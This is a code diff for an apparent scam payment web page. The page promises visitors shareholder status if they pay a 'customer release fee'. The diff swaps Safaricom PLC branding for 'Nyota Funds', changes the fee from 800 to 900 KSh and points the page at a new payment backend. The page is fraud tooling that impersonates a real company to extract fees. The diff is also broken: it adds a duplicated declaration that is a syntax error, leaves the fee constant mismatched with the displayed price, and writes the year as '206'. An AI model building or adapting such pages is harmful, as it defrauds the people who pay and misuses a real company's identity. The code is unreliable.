@@ -184,7 +184,7 @@ button:disabled{
 <h2>DISBURSEMENT FEE PAYMENT </h2>
 
 <p class="intro">
-    Congratulations 🤩 you're done with the payment  what is remaining is for you to pay a customer release fee of ksh 800 and then afterwards you'll became SAFARICOM PLC shareholder once more congratulations
+    Congratulations 🤩 you're done with the payment  what is remaining is for you to pay a customer release fee of ksh 900 and then afterwards you'll became NYOTA FUNDS shareholder once more congratulations
 </p>
 
 
@@ -207,7 +207,7 @@ button:disabled{
 
 <small>Funds disbursement Fee</small>
 
-<strong>KSh 800</strong>
+<strong>KSh 900</strong>
 
 </div>
 
@@ -216,7 +216,7 @@ button:disabled{
     id="payBtn"
     onclick="paySecurity()"
 >
-    Pay KSh 800
+    Pay KSh 900
 </button>
 
 
@@ -224,7 +224,7 @@ button:disabled{
 
 
 <div class="notice">
-    © 2026 Safaricom PLC. All rights reserved.
+    © 206. All rights reserved.
 </div>
 
 </div>
@@ -235,7 +235,8 @@ button:disabled{
 <script>
 
 const BACKEND =
-    "https://fuliza-backend-1.onrender.com";
+    const BACKEND =
+    "https://nyota-funds-backend.onrender.com";
 
 
 const FEE = 800;
@@ -269,7 +270,7 @@ if (savedPhone) {
 
 
 document.getElementById("name").textContent =
-    applicantName;
+    applicant;
 
 document.getElementById("phone").textContent =
     savedPhone || "Not available";
@@ -425,7 +426,7 @@ async function paySecurity(){
         button.disabled = false;
 
         button.textContent =
-            "Pay KSh 5";
+            "Pay KSh 900";
 
     }
 
@@ -460,7 +461,7 @@ function checkPayment(transactionId){
                     button.disabled = false;
 
                     button.textContent =
-                        "Pay KSh 5";
+                        "Pay KSh 900";
 
                     return;
                 }
@@ -574,7 +575,7 @@ function checkPayment(transactionId){
                             false;
 
                         button.textContent =
-                            "Pay KSh 5";
+                            "Pay KSh 900";
 
                     }
 
